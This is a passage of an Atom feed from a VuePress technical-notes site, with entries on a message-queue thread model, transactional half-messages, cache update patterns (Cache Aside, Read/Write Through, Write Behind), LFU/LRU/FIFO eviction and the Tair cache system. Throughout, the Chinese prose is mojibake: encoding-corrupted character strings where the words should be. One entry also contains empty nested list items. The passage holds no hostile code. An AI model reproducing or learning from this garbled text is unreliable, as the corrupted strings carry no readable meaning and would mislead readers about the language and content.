æ¥æ‰§è¡Œï¼ˆsendMessageExecutorï¼Œä»¥å‘é€æ¶ˆæ¯ä¸ºä¾‹ï¼Œå³ä¸ºä¸Šé¢çš„ â€œM2â€ï¼‰ã€‚</p>
<table>
<thead>
<tr>
<th>çº¿ç¨‹æ•°</th>
<th>çº¿ç¨‹å</th>
<th>çº¿ç¨‹å…·ä½“è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>NettyBoss_%d</td>
<td>Reactor ä¸»çº¿ç¨‹</td>
</tr>
<tr>
<td>N</td>
<td>NettyServerEPOLLSelector_%d_%d</td>
<td>Reactor çº¿ç¨‹æ± </td>
</tr>
<tr>
<td>M1</td>
<td>NettyServerCodecThread_%d</td>
<td>Workerçº¿ç¨‹æ± </td>
</tr>
<tr>
<td>M2</td>
<td>RemotingExecutorThread_%d</td>
<td>ä¸šåŠ¡processorå¤„ç†çº¿ç¨‹æ± </td>
</tr>
</tbody>
</table>
<h2 id="äº‹åŠ¡æ¶ˆæ¯" tabindex="-1"> äº‹åŠ¡æ¶ˆæ¯</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-16-34-31.png" alt="" loading="lazy"></p>
<ol>
<li>äº‹åŠ¡æ¶ˆæ¯ä¸æ™®é€šæ¶ˆæ¯çš„åŒºåˆ«å°±åœ¨äºæ¶ˆæ¯ç”Ÿäº§ç¯èŠ‚ï¼Œç”Ÿäº§è€…é¦–å…ˆé¢„å‘é€ä¸€æ¡æ¶ˆæ¯åˆ°MQ(è¿™ä¹Ÿè¢«ç§°ä¸ºå‘é€halfæ¶ˆæ¯)</li>
<li>MQæ¥å—åˆ°æ¶ˆæ¯åï¼Œå…ˆè¿›è¡ŒæŒä¹…åŒ–ï¼Œåˆ™å­˜å‚¨ä¸­ä¼šæ–°å¢ä¸€æ¡çŠ¶æ€ä¸ºå¾…å‘é€çš„æ¶ˆæ¯</li>
<li>ç„¶åè¿”å›ACKç»™æ¶ˆæ¯ç”Ÿäº§è€…ï¼Œæ­¤æ—¶MQä¸ä¼šè§¦å‘æ¶ˆæ¯æ¨é€äº‹ä»¶</li>
<li>ç”Ÿäº§è€…é¢„å‘é€æ¶ˆæ¯æˆåŠŸåï¼Œæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>æ‰§è¡Œæœ¬åœ°äº‹åŠ¡ï¼Œæ‰§è¡Œå®Œæˆåï¼Œå‘é€æ‰§è¡Œç»“æœç»™MQ</li>
<li>MQä¼šæ ¹æ®ç»“æœåˆ é™¤æˆ–è€…æ›´æ–°æ¶ˆæ¯çŠ¶æ€ä¸ºå¯å‘é€</li>
<li>å¦‚æœæ¶ˆæ¯çŠ¶æ€æ›´æ–°ä¸ºå¯å‘é€ï¼Œåˆ™MQä¼špushæ¶ˆæ¯ç»™æ¶ˆè´¹è€…ï¼Œåé¢æ¶ˆæ¯çš„æ¶ˆè´¹å’Œæ™®é€šæ¶ˆæ¯æ˜¯ä¸€æ ·çš„</li>
</ol>
<p>å±€é™æ€§ï¼š
é’ˆå¯¹æ¶ˆæ¯æ¶ˆè´¹å¤±è´¥åœºæ™¯ï¼Œå¦‚æœæ˜¯æ¶ˆæ¯å¤„ç†çœŸçš„å¤±è´¥äº†ï¼Œé‡è¯•å¤šæ¬¡ä»ç„¶å¤±è´¥ï¼Œå¦‚æ¶ˆæ¯æ¶ˆè´¹ä¾èµ–1-5ä¸šåŠ¡ç³»ç»Ÿï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4æ‰§è¡ŒæˆåŠŸï¼Œ5å¤±è´¥ï¼Œæ­¤æ—¶ï¼Œä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼Œå¦‚æœç›´æ¥å›æ»š1-4çš„æ“ä½œï¼Œå¤æ‚åº¦å¤ªé«˜ã€‚ç›®å‰è¿™é‡Œçš„å¤„ç†ä¸»è¦æ˜¯è¡¥å¿ç­–ç•¥å’Œå¯¹è´¦ã€‚</p>
<p>Metaqçš„å­˜å‚¨ç»“æ„æ˜¯æ–‡ä»¶è®°å½•å½¢å¼ï¼Œé€šè¿‡Offseté€’å¢è¿›è¡Œè®¿é—®æ•°æ®ï¼Œç¼ºä¹KVå­˜å‚¨å…·æœ‰çš„updateèƒ½åŠ›ï¼Œå¦‚æœè¦æ”¯æŒäº‹åŠ¡ï¼Œå¿…é¡»å¼•å…¥ç±»ä¼¼äºKVå­˜å‚¨çš„æ¨¡å—æ‰å¯ä»¥ã€‚æ‰€ä»¥Metaqç›®å‰å¯¹åˆ†å¸ƒå¼äº‹åŠ¡æ”¯æŒä¸å¥½ã€‚</p>
<h1 id="æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”" tabindex="-1"> æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”</h1>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ç¼“å­˜æ›´æ–°æ¨¡å¼</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<p>ç¼“å­˜æˆ‘ä»¬çŸ¥é“åˆ†ä¸ºæœ¬åœ°ç¼“å­˜å’Œåˆ†å¸ƒå¼ç¼“å­˜ï¼Œæœ¬åœ°ç¼“å­˜æ˜¯æœ¬æœºä½¿ç”¨ï¼Œéšç€æœ¬åœ°è®¡ç®—æœºç³»ç»Ÿå‘åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ‰©å±•ï¼Œåœ¨åˆ†å¸ƒå¼è®¡ç®—é¢†åŸŸä¸­å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ï¼Œç§°ä¸ºåˆ†å¸ƒå¼ç¼“å­˜ã€‚</p>
<p>åˆ†å¸ƒå¼ç¼“å­˜èƒ½å¤Ÿå¤„ç†å¤§é‡çš„åŠ¨æ€æ•°æ®ï¼Œå› æ­¤æ¯”è¾ƒé€‚åˆåº”ç”¨åœ¨Web 2.0æ—¶ä»£ä¸­çš„ç¤¾äº¤ç½‘ç«™ç­‰éœ€è¦ç”±ç”¨æˆ·ç”Ÿæˆå†…å®¹çš„åœºæ™¯ã€‚ä»æœ¬åœ°ç¼“å­˜æ‰©å±•åˆ°åˆ†å¸ƒå¼ç¼“å­˜åï¼Œå…³æ³¨é‡ç‚¹ä»CPUã€å†…å­˜ã€ç¼“å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“é€Ÿåº¦å·®å¼‚ä¹Ÿæ‰©å±•åˆ°äº†ä¸šåŠ¡ç³»ç»Ÿã€æ•°æ®åº“ã€åˆ†å¸ƒå¼ç¼“å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“é€Ÿåº¦å·®å¼‚ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-30-40.png" alt="" loading="lazy"></p>
<h1 id="ç¼“å­˜æ›´æ–°æ¨¡å¼" tabindex="-1"> ç¼“å­˜æ›´æ–°æ¨¡å¼</h1>
<h2 id="cache-aside" tabindex="-1"> Cache Aside</h2>
<p>å¸¸ç”¨çš„ç¼“å­˜æ¨¡å¼äº†ï¼Œå…·ä½“çš„æµç¨‹æ˜¯ï¼š</p>
<ul>
<li>å¤±æ•ˆï¼šåº”ç”¨ç¨‹åºå…ˆä» cache å–æ•°æ®ï¼Œæ²¡æœ‰å¾—åˆ°ï¼Œåˆ™ä»æ•°æ®åº“ä¸­å–æ•°æ®ï¼ŒæˆåŠŸåï¼Œæ”¾åˆ°ç¼“å­˜ä¸­ã€‚</li>
<li>å‘½ä¸­ï¼šåº”ç”¨ç¨‹åºä» cache ä¸­å–æ•°æ®ï¼Œå–åˆ°åè¿”å›ã€‚</li>
<li>æ›´æ–°ï¼šå…ˆæŠŠæ•°æ®å­˜åˆ°æ•°æ®åº“ä¸­ï¼ŒæˆåŠŸåï¼Œå†è®©ç¼“å­˜å¤±æ•ˆã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-45-40.png" alt="" loading="lazy"></p>
<h2 id="read-write-through-æ›´æ–°æ¨¡å¼" tabindex="-1"> Read/Write Through æ›´æ–°æ¨¡å¼</h2>
<p>åœ¨ä¸Šé¢çš„ Cache Aside æ›´æ–°æ¨¡å¼ä¸­ï¼Œåº”ç”¨ä»£ç éœ€è¦ç»´æŠ¤ä¸¤ä¸ªæ•°æ®å­˜å‚¨ï¼Œä¸€ä¸ªæ˜¯ç¼“å­˜ï¼ˆCacheï¼‰ï¼Œä¸€ä¸ªæ˜¯æ•°æ®åº“ï¼ˆRepositoryï¼‰ã€‚è€Œåœ¨Read/Write Through æ›´æ–°æ¨¡å¼ä¸­ï¼Œåº”ç”¨ç¨‹åºåªéœ€è¦ç»´æŠ¤ç¼“å­˜ï¼Œæ•°æ®åº“çš„ç»´æŠ¤å·¥ä½œç”±ç¼“å­˜ä»£ç†äº†ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-46-38.png" alt="" loading="lazy"></p>
<ul>
<li>Read Throughï¼šRead Through æ¨¡å¼å°±æ˜¯åœ¨æŸ¥è¯¢æ“ä½œä¸­æ›´æ–°ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç¼“å­˜å¤±æ•ˆçš„æ—¶å€™ï¼ŒCache Aside æ¨¡å¼æ˜¯ç”±è°ƒç”¨æ–¹è´Ÿè´£æŠŠæ•°æ®åŠ è½½å…¥ç¼“å­˜ï¼Œè€Œ Read Through åˆ™ç”¨ç¼“å­˜æœåŠ¡è‡ªå·±æ¥åŠ è½½ã€‚</li>
<li>Write Throughï¼šWrite Through æ¨¡å¼å’Œ Read Through ç›¸ä»¿ï¼Œä¸è¿‡æ˜¯åœ¨æ›´æ–°æ•°æ®æ—¶å‘ç”Ÿã€‚å½“æœ‰æ•°æ®æ›´æ–°çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­ç¼“å­˜ï¼Œç›´æ¥æ›´æ–°æ•°æ®åº“ï¼Œç„¶åè¿”å›ã€‚å¦‚æœå‘½ä¸­äº†ç¼“å­˜ï¼Œåˆ™æ›´æ–°ç¼“å­˜ï¼Œç„¶åç”±ç¼“å­˜è‡ªå·±æ›´æ–°æ•°æ®åº“ï¼ˆè¿™æ˜¯ä¸€ä¸ªåŒæ­¥æ“ä½œï¼‰ã€‚</li>
</ul>
<h2 id="write-behind-caching-æ›´æ–°æ¨¡å¼" tabindex="-1"> Write Behind Caching æ›´æ–°æ¨¡å¼</h2>
<p>Write Behind Caching æ›´æ–°æ¨¡å¼å°±æ˜¯åœ¨æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œåªæ›´æ–°ç¼“å­˜ï¼Œä¸æ›´æ–°æ•°æ®åº“ï¼Œè€Œæˆ‘ä»¬çš„ç¼“å­˜ä¼šå¼‚æ­¥åœ°æ‰¹é‡æ›´æ–°æ•°æ®åº“ã€‚è¿™ä¸ªè®¾è®¡çš„å¥½å¤„å°±æ˜¯ç›´æ¥æ“ä½œå†…å­˜é€Ÿåº¦å¿«ã€‚å› ä¸ºå¼‚æ­¥ï¼ŒWrite Behind Caching æ›´æ–°æ¨¡å¼è¿˜å¯ä»¥åˆå¹¶å¯¹åŒä¸€ä¸ªæ•°æ®çš„å¤šæ¬¡æ“ä½œåˆ°æ•°æ®åº“ï¼Œæ‰€ä»¥æ€§èƒ½çš„æé«˜æ˜¯ç›¸å½“å¯è§‚çš„ã€‚</p>
<p>ä½†å…¶å¸¦æ¥çš„é—®é¢˜æ˜¯ï¼Œæ•°æ®ä¸æ˜¯å¼ºä¸€è‡´æ€§çš„ï¼Œè€Œä¸”å¯èƒ½ä¼šä¸¢å¤±ã€‚å¦å¤–ï¼ŒWrite Behind Caching æ›´æ–°æ¨¡å¼å®ç°é€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œå› ä¸ºå®ƒéœ€è¦ç¡®è®¤æœ‰å“ªäº›æ•°æ®æ˜¯è¢«æ›´æ–°äº†çš„ï¼Œå“ªäº›æ•°æ®éœ€è¦åˆ·åˆ°æŒä¹…å±‚ä¸Šã€‚åªæœ‰åœ¨ç¼“å­˜éœ€è¦å¤±æ•ˆçš„æ—¶å€™ï¼Œæ‰ä¼šæŠŠå®ƒçœŸæ­£æŒä¹…èµ·æ¥ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-47-29.png" alt="" loading="lazy"></p>
<h2 id="æ€»ç»“" tabindex="-1"> æ€»ç»“</h2>
<p>ä¸‰ç§ç¼“å­˜æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ï¼š</p>
<p>Cache Aside æ›´æ–°æ¨¡å¼å®ç°èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯éœ€è¦ç»´æŠ¤ä¸¤ä¸ªæ•°æ®å­˜å‚¨ï¼Œä¸€ä¸ªæ˜¯ç¼“å­˜ï¼ˆCacheï¼‰ï¼Œä¸€ä¸ªæ˜¯æ•°æ®åº“ï¼ˆRepositoryï¼‰ã€‚</p>
<p>Read/Write Through æ›´æ–°æ¨¡å¼åªéœ€è¦ç»´æŠ¤ä¸€ä¸ªæ•°æ®å­˜å‚¨ï¼ˆç¼“å­˜ï¼‰ï¼Œä½†æ˜¯å®ç°èµ·æ¥è¦å¤æ‚ä¸€äº›ã€‚</p>
<p>Write Behind Caching æ›´æ–°æ¨¡å¼å’ŒRead/Write Through æ›´æ–°æ¨¡å¼ç±»ä¼¼ï¼ŒåŒºåˆ«æ˜¯Write Behind Caching æ›´æ–°æ¨¡å¼çš„æ•°æ®æŒä¹…åŒ–æ“ä½œæ˜¯å¼‚æ­¥çš„ï¼Œä½†æ˜¯Read/Write Through æ›´æ–°æ¨¡å¼çš„æ•°æ®æŒä¹…åŒ–æ“ä½œæ˜¯åŒæ­¥çš„ã€‚ä¼˜ç‚¹æ˜¯ç›´æ¥æ“ä½œå†…å­˜é€Ÿåº¦å¿«ï¼Œå¤šæ¬¡æ“ä½œå¯ä»¥åˆå¹¶æŒä¹…åŒ–åˆ°æ•°æ®åº“ã€‚ç¼ºç‚¹æ˜¯æ•°æ®å¯èƒ½ä¼šä¸¢å¤±ï¼Œä¾‹å¦‚ç³»ç»Ÿæ–­ç”µç­‰ã€‚</p>
<p>ç¼“å­˜æ˜¯é€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥æé«˜æ€§èƒ½çš„ã€‚æ‰€ä»¥ä½¿ç”¨ç¼“å­˜æå‡æ€§èƒ½ï¼Œå°±æ˜¯ä¼šæœ‰æ•°æ®æ›´æ–°çš„å»¶è¿Ÿã€‚è¿™éœ€è¦æˆ‘ä»¬åœ¨è®¾è®¡æ—¶ç»“åˆä¸šåŠ¡ä»”ç»†æ€è€ƒæ˜¯å¦é€‚åˆç”¨ç¼“å­˜ã€‚ç„¶åç¼“å­˜ä¸€å®šè¦è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´å¤ªçŸ­å¤ªé•¿éƒ½ä¸å¥½ï¼Œå¤ªçŸ­çš„è¯è¯·æ±‚å¯èƒ½ä¼šæ¯”è¾ƒå¤šçš„è½åˆ°æ•°æ®åº“ä¸Šï¼Œè¿™ä¹Ÿæ„å‘³ç€å¤±å»äº†ç¼“å­˜çš„ä¼˜åŠ¿ã€‚å¤ªé•¿çš„è¯ç¼“å­˜ä¸­çš„è„æ•°æ®ä¼šä½¿ç³»ç»Ÿé•¿æ—¶é—´å¤„äºä¸€ä¸ªå»¶è¿Ÿçš„çŠ¶æ€ï¼Œè€Œä¸”ç³»ç»Ÿä¸­é•¿æ—¶é—´æ²¡æœ‰äººè®¿é—®çš„æ•°æ®ä¸€ç›´å­˜åœ¨å†…å­˜ä¸­ä¸è¿‡æœŸï¼Œæµªè´¹å†…å­˜ã€‚</p>
<h1 id="ç¼“å­˜æ·˜æ±°ç®—æ³•" tabindex="-1"> ç¼“å­˜æ·˜æ±°ç®—æ³•</h1>
<p>ç¼“å­˜æ·˜æ±°ç®—æ³•æ˜¯æŒ‡ä»¤çš„ä¸€ä¸ªæ˜ç»†è¡¨ï¼Œç”¨äºå†³å®šç¼“å­˜ç³»ç»Ÿä¸­å“ªäº›æ•°æ®åº”è¯¥è¢«åˆ å»ã€‚</p>
<h2 id="æœ€ä¸ç»å¸¸ä½¿ç”¨ç®—æ³•-lfu" tabindex="-1"> æœ€ä¸ç»å¸¸ä½¿ç”¨ç®—æ³•ï¼ˆLFUï¼‰</h2>
<p>è¿™ä¸ªç¼“å­˜ç®—æ³•ä½¿ç”¨ä¸€ä¸ªè®¡æ•°å™¨æ¥è®°å½•æ¡ç›®è¢«è®¿é—®çš„é¢‘ç‡ã€‚é€šè¿‡ä½¿ç”¨LFUç¼“å­˜ç®—æ³•ï¼Œæœ€ä½è®¿é—®æ•°çš„æ¡ç›®é¦–å…ˆè¢«ç§»é™¤ã€‚è¿™ä¸ªæ–¹æ³•å¹¶ä¸ç»å¸¸ä½¿ç”¨ï¼Œå› ä¸ºå®ƒæ— æ³•å¯¹ä¸€ä¸ªæ‹¥æœ‰æœ€åˆé«˜è®¿é—®ç‡ä¹‹åé•¿æ—¶é—´æ²¡æœ‰è¢«è®¿é—®çš„æ¡ç›®ç¼“å­˜è´Ÿè´£ã€‚</p>
<h2 id="æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•-lru" tabindex="-1"> æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•ï¼ˆLRUï¼‰</h2>
<p>LRUï¼ˆThe Least Recently Usedï¼Œæœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç®—æ³•ï¼‰æ˜¯ä¸€ç§å¸¸è§çš„ç¼“å­˜ç®—æ³•ï¼Œåœ¨å¾ˆå¤šåˆ†å¸ƒå¼ç¼“å­˜ç³»ç»Ÿï¼ˆå¦‚Redis, Memcachedï¼‰ä¸­éƒ½æœ‰å¹¿æ³›ä½¿ç”¨ã€‚</p>
<p>è¿™ä¸ªç¼“å­˜ç®—æ³•å°†æœ€è¿‘ä½¿ç”¨çš„æ¡ç›®å­˜æ”¾åˆ°é è¿‘ç¼“å­˜é¡¶éƒ¨çš„ä½ç½®ã€‚å½“ä¸€ä¸ªæ–°æ¡ç›®è¢«è®¿é—®æ—¶ï¼ŒLRUå°†å®ƒæ”¾ç½®åˆ°ç¼“å­˜çš„é¡¶éƒ¨ã€‚å½“ç¼“å­˜è¾¾åˆ°æé™æ—¶ï¼Œè¾ƒæ—©ä¹‹å‰è®¿é—®çš„æ¡ç›®å°†ä»ç¼“å­˜åº•éƒ¨å¼€å§‹è¢«ç§»é™¤ã€‚è¿™é‡Œä¼šä½¿ç”¨åˆ°æ˜‚è´µçš„ç®—æ³•ï¼Œè€Œä¸”å®ƒéœ€è¦è®°å½•â€œå¹´é¾„ä½â€æ¥ç²¾ç¡®æ˜¾ç¤ºæ¡ç›®æ˜¯ä½•æ—¶è¢«è®¿é—®çš„ã€‚æ­¤å¤–ï¼Œå½“ä¸€ä¸ªLRUç¼“å­˜ç®—æ³•åˆ é™¤æŸä¸ªæ¡ç›®åï¼Œâ€œå¹´é¾„ä½â€å°†éšå…¶ä»–æ¡ç›®å‘ç”Ÿæ”¹å˜ã€‚</p>
<h2 id="å…ˆè¿›å…ˆå‡ºç®—æ³•-fifo" tabindex="-1"> å…ˆè¿›å…ˆå‡ºç®—æ³•ï¼ˆFIFOï¼‰</h2>
<p>FIFOæ˜¯è‹±æ–‡First In First Out çš„ç¼©å†™ï¼Œæ˜¯ä¸€ç§å…ˆè¿›å…ˆå‡ºçš„æ•°æ®ç¼“å­˜å™¨ï¼Œä»–ä¸æ™®é€šå­˜å‚¨å™¨çš„åŒºåˆ«æ˜¯æ²¡æœ‰å¤–éƒ¨è¯»å†™åœ°å€çº¿ï¼Œè¿™æ ·ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œä½†ç¼ºç‚¹å°±æ˜¯åªèƒ½é¡ºåºå†™å…¥æ•°æ®ï¼Œé¡ºåºçš„è¯»å‡ºæ•°æ®ï¼Œå…¶æ•°æ®åœ°å€ç”±å†…éƒ¨è¯»å†™æŒ‡é’ˆè‡ªåŠ¨åŠ 1å®Œæˆï¼Œä¸èƒ½åƒæ™®é€šå­˜å‚¨å™¨é‚£æ ·å¯ä»¥ç”±åœ°å€çº¿å†³å®šè¯»å–æˆ–å†™å…¥æŸä¸ªæŒ‡å®šçš„åœ°å€ã€‚</p>
<h1 id="tair" tabindex="-1"> Tair</h1>
<p>Tairæ˜¯ä¸€ä¸ªç±»ä¼¼äºmapçš„key/valueç»“æ„å­˜å‚¨ç³»ç»Ÿï¼ˆä¹Ÿå°±æ˜¯ç¼“å­˜ç³»ç»Ÿï¼‰ï¼Œå…·å¤‡æ ‡å‡†çš„ç‰¹æ€§æ˜¯ï¼šé«˜æ€§èƒ½ã€é«˜æ‰©å±•ã€é«˜å¯é ï¼Œä¹Ÿå°±æ˜¯ä¼ è¯´ä¸­çš„ä¸‰é«˜äº§å“ï¼Œæ”¯æŒåˆ†å¸ƒå¼é›†ç¾¤éƒ¨ç½²ã€‚å®˜ç½‘è¯´ç›®å‰æ”¯æŒjavaå’Œcè¿™ä¸¤ä¸ªç‰ˆæœ¬ã€‚</p>
<ul>
<li>é«˜æ€§èƒ½â€”â€”åŸºäºé«˜é€Ÿç¼“å­˜ã€å†…å­˜æˆ–è€…ssd</li>
<li>é«˜æ‰©å±•â€”â€”è½»é‡ä¸­é—´ä»¶+ä¸‰ç§æ•°æ®å¼•æ“+è´Ÿè½½å‡è¡¡</li>
<li>é«˜å¯ç”¨â€”â€”å„ç§å®¹ç¾éƒ¨ç½²æ–¹å¼å’Œè§£å†³æ–¹æ¡ˆ</li>
</ul>
<h2 id="ä¸»è¦åŠŸèƒ½" tabindex="-1"> ä¸»è¦åŠŸèƒ½ï¼š</h2>
<ul>
<li>æ•°æ®åº“ç¼“å­˜â€”â€”ä½œä¸ºæ•°æ®åº“ä¸daoå±‚ä¹‹é—´çš„ä¸­é—´ç¼“å­˜ï¼Œé™ä½å¯¹åç«¯æ•°æ®åº“çš„è®¿é—®å‹åŠ›ï¼Œé«˜é€Ÿç¼“å­˜èƒ½ä½¿å¾—è®¿é—®é€Ÿåº¦è¾¾åˆ°1msçº§åˆ«ï¼Œä¾‹å¦‚é«˜é¢‘ç‡çš„æ•°æ®åº“æŸ¥è¯¢ï¼›</li>
<li>ä¸´æ—¶æ•°æ®å­˜å‚¨â€”â€”åº”ç”¨ç¨‹åºéœ€è¦ç»´æŠ¤å¤§é‡ä¸´æ—¶æ•°æ®ï¼Œå°†ä¸´æ—¶æ•°æ®å­˜å‚¨åœ¨mdbä¸­ï¼Œå¯ä»¥é™ä½å†…å­˜ç®¡ç†çš„å¼€é”€ï¼Œæ”¹è¿›åº”ç”¨ç¨‹åºå·¥ä½œè´Ÿè½½ã€‚ä¾‹å¦‚ï¼šåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼ŒåŒä¸€ä¸ªç”¨æˆ·çš„ä¸åŒè¯·æ±‚å¯èƒ½ä¼šå‘é€åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œè¿™æ—¶å¯ä»¥ç”¨mdbä½œä¸ºå…¨å±€å­˜å‚¨ï¼Œç”¨äºä¿å­˜Sessionæ•°æ®ã€ç”¨æˆ·çš„Tokenã€æƒé™ä¿¡æ¯ç­‰æ•°æ®ã€‚ã€é€šå¸¸å°†ç¼“å­˜å’Œä¸´æ—¶æ•°æ®å­˜å‚¨ç»Ÿç§°ä¸ºâ€œéæŒä¹…åŒ–å­˜å‚¨â€ã€‘</li>
<li>æŒä¹…åŒ–å­˜å‚¨â€”â€”æ­¤æ—¶ç±»ä¼¼äºä¼ ç»Ÿçš„æ•°æ®åº“ï¼Œå°†æ•°æ®å­˜å…¥ç£ç›˜ä¸­åšæŒä¹…åŒ–å­˜å‚¨ï¼Œä¾‹å¦‚å¹¿å‘Šæ¨èç±»éœ€è¦ç¦»çº¿è®¡ç®—å¤§é‡æ•°æ®ä»¥åŠæ¦œå•çš„ç”Ÿæˆï¼ˆæ³¨æ„ï¼šç”±äºæ­¤æ—¶é‡‡ç”¨çš„æ•°æ®åº“å¼•æ“ldbæ˜¯NoSQLç±»å‹çš„ï¼Œæ‰€ä»¥ä¸æ”¯æŒsqlæŸ¥è¯¢ï¼‰</li>
</ul>
<h2 id="æ¶æ„" tabindex="-1"> æ¶æ„</h2>
<h3 id="ç‰©ç†æ¶æ„" tabindex="-1"> ç‰©ç†æ¶æ„</h3>
<p>Tairæ˜¯Master/Slaveç»“æ„ã€‚Config Serverç®¡ç†Data ServerèŠ‚ç‚¹ã€ç»´æŠ¤Data Serverçš„çŠ¶æ€ä¿¡æ¯ï¼›Data Serverè´Ÿè´£æ•°æ®å­˜å‚¨ï¼ŒæŒ‰ç…§Config Serverçš„æŒ‡ç¤ºå®Œæˆæ•°æ®å¤åˆ¶å’Œè¿ç§»å·¥ä½œï¼Œå¹¶å®šæ—¶ç»™Config Serverå‘é€å¿ƒè·³ä¿¡æ¯ã€‚Config Serveræ˜¯å•ç‚¹ï¼Œé‡‡ç”¨ä¸€ä¸»ä¸€å¤‡çš„æ–¹å¼ä¿è¯å¯é æ€§ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-37-50.png" alt="" loading="lazy"></p>
<h3 id="é€»è¾‘æ¶æ„" tabindex="-1"> é€»è¾‘æ¶æ„</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-38-17.png" alt="" loading="lazy"></p>
<h2 id="å­˜å‚¨æ¨¡å¼å¯¹æ¯”" tabindex="-1"> å­˜å‚¨æ¨¡å¼å¯¹æ¯”</h2>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>åŸºäºæ•°æ®åº“</th>
<th>ç‰¹ç‚¹</th>
<th>é€‚ç”¨åœºæ™¯</th>
</tr>
</thead>
<tbody>
<tr>
<td>MDB</td>
<td>Memcached</td>
<td>åŸºäºå†…å­˜ï¼›ä»…æ”¯æŒk-vç±»å‹æ•°æ®ï¼›ä¸æ”¯æŒæŒä¹…åŒ–</td>
<td>æ•°æ®å°è€Œç®€å•ï¼Œè¯»å¤šï¼ˆQPS ä¸‡ä»¥ä¸Šï¼‰å†™å°‘ï¼Œä¸”å¶å°”æ•°æ®ä¸¢å¤±ä¸åº”è¯¥å¯¹ä¸šåŠ¡äº§ç”Ÿè¾ƒå¤§å½±å“ï¼›ä¾‹å¦‚è®¿é—®é‡æ˜¾ç¤ºï¼Œsession managerç­‰åŠŸèƒ½</td>
</tr>
<tr>
<td>RDB</td>
<td>Redis</td>
<td>åŸºäºå†…å­˜ï¼›é™¤äº†kvï¼Œè¿˜æ”¯æŒstring, list, hash, set, sortedsetç­‰æ•°æ®ç±»å‹ï¼›</td>
<td>æ”¯æŒä¸€å®šç¨‹åº¦çš„æŒä¹…åŒ–</td>
</tr>
<tr>
<td>LDB</td>
<td>LevelDB</td>
<td>åŸºäºssdç¡¬ç›˜ï¼›ä»…æ”¯æŒk-vç±»å‹æ•°æ®ï¼›æ”¯æŒæŒä¹…åŒ–</td>
<td>æ•°æ®ç®€å•ï¼Œæœ‰æŒä¹…åŒ–éœ€æ±‚ï¼Œä¸”è¯»å†™QPSè¾ƒé«˜ï¼ˆä¸‡çº§åˆ«ï¼‰ä½†å­˜å‚¨æ•°æ®è¾ƒç®€å•çš„åº”ç”¨åœºæ™¯ï¼›ä¾‹å¦‚è®¢å•è®¡æ•°ï¼Œåº“å­˜è®°å½•ç­‰åŠŸèƒ½ï¼Œæ›´æ–°éå¸¸é¢‘ç¹ã€‚</td>
</tr>
</tbody>
</table>
<h2 id="æ•°æ®ä¸€è‡´æ€§" tabindex="-1"> æ•°æ®ä¸€è‡´æ€§</h2>
<p>Tairä½¿ç”¨ç‰ˆæœ¬å·versionæ¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ã€‚åœ¨Tairçš„putæ¥å£ä¸­æœ‰versionå‚æ•°ï¼Œå¦‚æœä¸å¸¦versionå‚æ•°ï¼Œåˆ™ä¸è€ƒè™‘å¹¶å‘ï¼Œç›´æ¥å¼ºåˆ¶æ›´æ–°ã€‚</p>
<ul>
